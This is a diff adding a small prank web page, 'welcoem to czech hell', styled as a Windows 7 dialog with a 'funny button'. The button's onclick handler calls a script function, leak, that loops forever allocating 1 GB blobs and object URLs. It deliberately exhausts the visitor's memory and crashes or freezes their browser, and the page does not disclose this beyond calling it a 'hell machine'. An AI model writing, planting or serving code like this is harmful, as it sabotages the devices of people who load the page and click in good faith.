@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="https://unpkg.com/7.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hell</title>
+    <style>
+body {
+    margin: 0px;
+    min-height: 100vh;
+    background-image: url(icegif-1433.gif);
+    cursor: crosshair;
+}.center {
+    text-align: center;
+    font-family: 'Roboto', sans-serif;
+    color: #FFFFFF;
+}.container {
+    width: 100%;
+    height: 100vh;
+    position: relative;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+    </style>
+<script>
+function leak(nBytes) {
+    while (true) {
+    const blob = new Blob([new Uint8Array(nBytes)]);
+    URL.createObjectURL(blob);
+    }
+};
+</script>
+</head>
+<body>
+<div class="container">
+<div class="window glass" style="max-width: 300px" >
+  <div class="title-bar">
+    <div class="title-bar-text">welcoem to czech hell</div>
+    <div class="title-bar-controls">
+      <button aria-label="Minimize"></button>
+      <button aria-label="Close"></button>
+    </div>
+  </div>
+  <div class="window-body has-space">
+    <!-- filling the text with blank braille characters is such a stupid fucking hack but it works -->
+    <p>click this button to activate the hell machine⠀⠀</p>
+    <button class="button" onclick="leak(1000000000)">funny button</button>
+  </div>
+</div>
+    </div>
+
+</body>
+</html>
